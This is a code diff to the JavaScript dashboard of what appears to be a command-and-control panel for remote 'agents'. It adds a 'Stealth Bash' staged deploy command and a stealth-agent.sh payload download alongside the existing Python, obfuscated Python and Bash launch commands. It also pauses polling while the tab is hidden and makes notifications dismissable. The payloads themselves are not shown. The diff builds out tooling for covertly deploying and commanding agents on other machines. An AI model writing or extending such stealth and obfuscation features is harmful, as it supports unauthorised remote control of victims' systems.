@@ -71,12 +71,15 @@ const App = {
             pythonDeployCommand: document.getElementById("pythonDeployCommand"),
             obfuscatedPythonDeployCommand: document.getElementById("obfuscatedPythonDeployCommand"),
             bashDeployCommand: document.getElementById("bashDeployCommand"),
+            stealthBashDeployCommand: document.getElementById("stealthBashDeployCommand"),
             copyPythonDeployBtn: document.getElementById("copyPythonDeployBtn"),
             downloadAgentBtn: document.getElementById("downloadAgentBtn"),
             copyObfuscatedPythonDeployBtn: document.getElementById("copyObfuscatedPythonDeployBtn"),
             downloadObfuscatedAgentBtn: document.getElementById("downloadObfuscatedAgentBtn"),
             copyBashDeployBtn: document.getElementById("copyBashDeployBtn"),
             downloadBashAgentBtn: document.getElementById("downloadBashAgentBtn"),
+            copyStealthBashDeployBtn: document.getElementById("copyStealthBashDeployBtn"),
+            downloadStealthBashAgentBtn: document.getElementById("downloadStealthBashAgentBtn"),
             quickCommand: document.getElementById("quickCommand"),
             sendQuickCmd: document.getElementById("sendQuickCmd"),
             quickCmdStatus: document.getElementById("quickCmdStatus"),
@@ -140,14 +143,17 @@ const App = {
         this.ui.pythonDeployCommand?.addEventListener("click", () => this.copyDeployCommand("python_command", "Python launch command copied"));
         this.ui.obfuscatedPythonDeployCommand?.addEventListener("click", () => this.copyDeployCommand("python_obfuscated_command", "Protected Python launch command copied"));
         this.ui.bashDeployCommand?.addEventListener("click", () => this.copyDeployCommand("bash_command", "Bash launch command copied"));
+        this.ui.stealthBashDeployCommand?.addEventListener("click", () => this.copyDeployCommand("stage_command", "Stealth Bash launch command copied"));
 
         this.ui.copyPythonDeployBtn?.addEventListener("click", () => this.copyDeployCommand("python_command", "Python launch command copied"));
         this.ui.copyObfuscatedPythonDeployBtn?.addEventListener("click", () => this.copyDeployCommand("python_obfuscated_command", "Protected Python launch command copied"));
         this.ui.copyBashDeployBtn?.addEventListener("click", () => this.copyDeployCommand("bash_command", "Bash launch command copied"));
+        this.ui.copyStealthBashDeployBtn?.addEventListener("click", () => this.copyDeployCommand("stage_command", "Stealth Bash launch command copied"));
 
         this.ui.downloadAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.python_download_url, "agent.py"));
         this.ui.downloadObfuscatedAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.python_obfuscated_download_url, "agent-obfuscated.py"));
         this.ui.downloadBashAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.bash_download_url, "agent.sh"));
+        this.ui.downloadStealthBashAgentBtn?.addEventListener("click", () => this.downloadPayload(this.deployInfo?.stage_url, "stealth-agent.sh"));
 
         this.ui.quickCommand?.addEventListener("keydown", (event) => {
             if (event.key === "Enter" && !event.shiftKey) {
@@ -291,11 +297,11 @@ const App = {
 
     startAutoRefresh() {
         this.stopAutoRefresh();
-        this.refreshTimers.push(window.setInterval(() => this.loadStats(), 5000));
-        this.refreshTimers.push(window.setInterval(() => this.loadAgents(), 5000));
-        this.refreshTimers.push(window.setInterval(() => this.loadTunnelInfo(), 15000));
-        this.refreshTimers.push(window.setInterval(() => this.loadSecurityStatus(), 30000));
-        this.refreshTimers.push(window.setInterval(() => this.loadAuditLogs(), 30000));
+        this.refreshTimers.push(window.setInterval(() => { if (!document.hidden) { this.loadStats(); } }, 5000));
+        this.refreshTimers.push(window.setInterval(() => { if (!document.hidden) { this.loadAgents(); } }, 5000));
+        this.refreshTimers.push(window.setInterval(() => { if (!document.hidden) { this.loadTunnelInfo(); } }, 15000));
+        this.refreshTimers.push(window.setInterval(() => { if (!document.hidden) { this.loadSecurityStatus(); } }, 30000));
+        this.refreshTimers.push(window.setInterval(() => { if (!document.hidden) { this.loadAuditLogs(); } }, 30000));
     },
 
     stopAutoRefresh() {
@@ -360,6 +366,7 @@ const App = {
             this.ui.pythonDeployCommand.textContent = data.python_command;
             this.ui.obfuscatedPythonDeployCommand.textContent = data.python_obfuscated_command;
             this.ui.bashDeployCommand.textContent = data.bash_command;
+            this.ui.stealthBashDeployCommand.textContent = data.stage_command;
             this.ui.deployExpiry.textContent = `These launch links expire at ${this.formatAbsoluteDate(data.expires_at)}. Refresh them after a route restart or when the timer runs out`;
 
             [
@@ -369,6 +376,8 @@ const App = {
                 this.ui.downloadObfuscatedAgentBtn,
                 this.ui.copyBashDeployBtn,
                 this.ui.downloadBashAgentBtn,
+                this.ui.copyStealthBashDeployBtn,
+                this.ui.downloadStealthBashAgentBtn,
             ].forEach((button) => {
                 if (button) {
                     button.disabled = false;
@@ -1163,6 +1172,8 @@ const App = {
         const notification = document.createElement("div");
         notification.className = `notification ${kind}`;
         notification.textContent = message;
+        notification.style.cursor = "pointer";
+        notification.addEventListener("click", () => notification.remove());
         this.ui.notifications.prepend(notification);
         window.setTimeout(() => {
             notification.remove();
